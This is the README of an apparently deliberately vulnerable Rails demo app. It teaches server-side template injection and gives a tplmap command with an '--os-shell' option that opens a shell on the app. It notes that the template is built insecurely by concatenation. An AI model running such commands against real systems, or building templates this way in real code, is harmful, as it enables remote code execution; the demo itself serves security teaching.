# # Hands-on SSTI attack on Rails app

This application is a demonstration prototype just to show how to perform SSTI (Server side templating injection) attack.

## Run server

```console
rails server
```

## Hack

Run SSTI attack with [tplmap](https://github.com/epinna/tplmap/blob/master/README.md):

```console
./tplmap.py --data 'name=value1' --engine erb --os-shell -u 'http://localhost:3000'
```

In this example, the template is built by concatenation :scream:
